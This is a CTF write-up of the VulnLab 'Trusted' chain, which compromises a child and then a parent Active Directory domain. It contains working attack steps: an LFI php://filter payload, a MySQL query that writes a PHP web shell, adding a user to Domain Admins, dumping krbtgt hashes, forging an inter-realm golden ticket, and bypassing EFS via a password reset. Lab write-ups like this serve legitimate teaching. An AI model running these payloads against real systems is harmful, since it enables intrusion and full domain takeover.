Title: Trusted
Slug: ctf/vulnlab/chains/trusted
Date: 2025-04-16 18:00
Category: CTF

Hybrid is an easy VulnLab chain.

<iframe width="536" height="620" src="https://api.vulnlab.com/api/v1/share?id=07ab87ea-e8f7-4ac5-91cf-8edb5e2fc576"/>

Target is:

- 10.10.161.149
- 10.10.161.150
## Enumeration

~~~shell
sudo nmap -sC -sV -iL targets.txt -oN nmap.txt
~~~

~~~
# Nmap 7.95 scan initiated Wed Apr 16 10:16:07 2025 as: /usr/lib/nmap/nmap -sC -sV -iL targets.txt -oN nmap.txt
Nmap scan report for 10.10.161.149
Host is up (0.032s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-16 08:16:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-04-16T08:16:42+00:00; +5s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TRUSTED
|   NetBIOS_Domain_Name: TRUSTED
|   NetBIOS_Computer_Name: TRUSTEDDC
|   DNS_Domain_Name: trusted.vl
|   DNS_Computer_Name: trusteddc.trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-16T08:16:27+00:00
| ssl-cert: Subject: commonName=trusteddc.trusted.vl
| Not valid before: 2025-04-15T08:14:27
|_Not valid after:  2025-10-15T08:14:27
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-16T08:16:31
|_  start_date: N/A
|_clock-skew: mean: 4s, deviation: 0s, median: 4s

Nmap scan report for 10.10.161.150
Host is up (0.032s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| http-title: Welcome to XAMPP
|_Requested resource was http://10.10.161.150/dashboard/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-16 08:16:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://10.10.161.150/dashboard/
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 11
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsTransactions, SupportsCompression, Speaks41ProtocolNew, SupportsLoadDataLocal, FoundRows, Speaks41ProtocolOld, LongColumnFlag, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, ODBCClient, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: f@M@<H7z$?R\Z0{?eb::
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: LABDC
|   DNS_Domain_Name: lab.trusted.vl
|   DNS_Computer_Name: labdc.lab.trusted.vl
|   DNS_Tree_Name: trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-16T08:16:26+00:00
| ssl-cert: Subject: commonName=labdc.lab.trusted.vl
| Not valid before: 2025-04-15T08:14:25
|_Not valid after:  2025-10-15T08:14:25
|_ssl-date: 2025-04-16T08:16:42+00:00; +5s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-16T08:16:35
|_  start_date: N/A
|_clock-skew: mean: 4s, deviation: 0s, median: 4s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Post-scan script results:
| clock-skew: 
|   4s: 
|     10.10.161.149
|_    10.10.161.150
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 16 10:16:48 2025 -- 2 IP addresses (2 hosts up) scanned in 41.11 seconds
~~~

Host `10.10.161.150` is the DC for the child domain `lab.trusted.vl`.
Host `10.10.161.149` is the DC for the parent domain `trusted.vl`.

Add host entries to `/etc/hosts`:

![[host-entries.png]]

Windows host `labdc.lab.trusted.vl` runs XAMPP on port `80`. Nothing too interesting is found beside default html pages; a directory bruteforce is then launched as follows: 

~~~shell
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-sma
ll-directories-lowercase.txt -u http://10.10.161.150/
~~~

![[labdc-dir-brute.png]]

## labdc.lab.trusted.vl

### Foothold

The path `/dev` hosts a web page containing an interesting message:

![[labdc-dev.png]]

A php script should be present somewhere; try brute forcing common files;

~~~shell
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -u http://10.10.161.150/dev 
~~~


![[labdc-file-brute.png]]

File `db.php` is found but it seems to do nothing interesting:

![[labdc-db-php.png]]

Navigate trough the site it seems that parameter `view` is used to load html pages:

![[labdc-view-param.png]]

Trying inserting a not-existing page, a php error is returned leaking the usage of the `include` function:

![[labdc-view-include.png]]

Abuse this function to exfiltrate `db.php` using php filters:

![[labdc-lfi-php-filter.png]]

Filter is the following:

~~~php
php://filter/read=convert.base64.encode/resource=db.php
~~~

The content of `db.php` is the following:

~~~php
<?php 
$servername = "localhost";
$username = "root";
$password = "SuperSecureMySQLPassw0rd1337.";

$conn = mysqli_connect($servername, $username, $password);

if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";

~~~

Use `mysql` to connect to the remote database:

~~~shell
mysql -u root -h 10.10.161.150 -p
mysql -u root -h 10.10.161.150 -p --disable-ssl-verify-server-cert
~~~

![[labdc-mysql-client.png]]

**Note**: use `--disable-ssl-verify-server-cert` flag to skip certificate validation for TLS.

### Credentials Harvesting

In the database `news` is present the table `users` containing some users and password md5 hashes:

![[labdc-db-passwords.png]]

Dump users and password hashes with a better format:

~~~sql
select short_handle,password from users \G;
~~~

![[labdc-db-passwords-formatted.png]]

Dumped users and hashes are:

~~~
rsmith:7e7abb54bbef42f0fbfa3007b368def7
ewalters:d6e81aeb4df9325b502a02f11043e0ad
cpowers:e3d3eb0f46fe5d75eed8d11d54045a60
~~~

Try cracking hashes using rainbow tables:

![[labdc-crackstation.png]]

Recoverd password `IHateEric2` for user `rsmith`.

Confirm that found usernames do exist in the DC:

~~~shell
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='lab.trusted.vl',userdb=usernames.txt" 10.10.161.150
~~~

![[labdc-confirm-users.png]]

### Privilege Escalation

Found user `rsmith` does not have any particular privilege neither access to the DC (RDP, WMI or via SMB).

It's possible to abuse access to the database in order to upload a php reverse shell by running the following query:

~~~sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\dev\\shell.php'
~~~

Check user running XAMPP:

![[labdc-revshell.png]]

Check if it's possible to run powershell commands and that ActiveDirectory module is enabled:

~~~
http://10.10.161.150/dev/shell.php?cmd=powershell%20-c%20%22Get-ADGroupMember%20-Identity%20%20%27Domain%20Admins%27%20%22
~~~

![[labdc-confirm-ad-mdoule.png]]

Having elevated user `nt authority\system`, it's possible to elevate privileges for `rmsith` by adding him to `Domain Admins` group with the following request:

~~~
http://10.10.161.150/dev/shell.php?cmd=powershell -c "Add-ADGroupMember -Identity%20 'Domain Admins' -Members 'rsmith' "
~~~

![[labdc-add-domain-admin.png]]

Confirm that `rsmith` is now domain administrator:

![[labdc-confirm-da.png]]

## trusteddc.trusted.vl

### Child to Parent Privilege Escalation

With elevated privileges, it's not possible to open an interactive shell:

~~~shell
evil-winrm -u rsmith -p IHateEric2 -i 10.10.161.150 
~~~


Try getting user flag located at `C:\Users\ewalters\Desktop` (but get trolled, lol):

![[labdc-fake-user-flag.png]]

Real user flag is located at `C:\Users\Administrator\Desktop`:

![[labdc-user-flag.png]]

Enumerate trusts for current DC:

~~~powershell
Get-ADTrust -Filter *
~~~

![[labdc-trusts.png]]

A bidirectional trust between `lab.trusted.vl` and `trusted.vl` exists. This could be abused to forge an inter-realm golden ticket and obtain access as administrator to the parent domain. 

Firstly, recover both child and parent domains SIDs: 

~~~shell
nxc ldap 10.10.161.150 -d lab.trusted.vl -u rsmith -p IHateEric2 --get-sidnxc 
nxc ldap 10.10.161.149 -d lab.trusted.vl -u rsmith -p IHateEric2 --get-sid
~~~

![[dump-sids.png]]

Use `impacket`'s `secretsdump` to dump `krbtgt`'s NT hash:

~~~shell
impacket-secretsdump lab.trusted.vl/rsmith@10.10.161.150
~~~

![[labdc-secretsdump.png]]

Use SIDs and  `krbtgt`'s hash to forge the golden ticket as follows:

~~~shell
impacket-ticketer -domain lab.trusted.vl -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -nthash c7a03c565c68c6fac5f8913fab576ebd Administrator
~~~


![[labdc-golden-ticket.png]]

Use forget ticket to open a shell on parent DC:

~~~shell
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k lab.trusted.vl/Administrator@trusteddc.trusted.vl -no-pass
~~~

![[trusteddc-shell.png]]

### EFS Encryption Bypass

Trying access the root flag but Windows returns `Access is denied`. This is due EFS encryption on the `C:\Users\Administrator\Desktop` files as showed below:

![[trusteddc-root-flag-inaccessible.png]]

Try decrypting the flag file with current cmd session is unsuccessful since the private key (the encryption certificate) it's not present:

~~~cmd
cipher.exe /d root.txt
~~~

![[trusteddc-fail-to-decrypt.png]]

After switching to `evil-winrm` (yeah, lazy ass), upload `RunasCs.exe` on the machine and setting password to `Password123!` for `Administrator`, run the following command to obtain the flag content:

~~~powerhsell
net user Administrator Password123!
~~~

![[trusteddc-change-administrator-password.png]]

~~~powershell
.\RunasCs.exe Administrator Password123! "cmd /c type C:\Users\Administrator\Desktop\root.txt"
~~~

![[trusteddc-runascs.png]]

RunasCS will execute the command as the `Administrator` user, having therefore its EFS encryption certificate loaded.

**Note**: starting a psexec session with `Administrator` won't work since the full user profile it's not loaded (the certificate should have been imported manually).

Another way to bypass the encryption would have been starting an RDP session; this, however, required to disable the Restricted Admin mode.
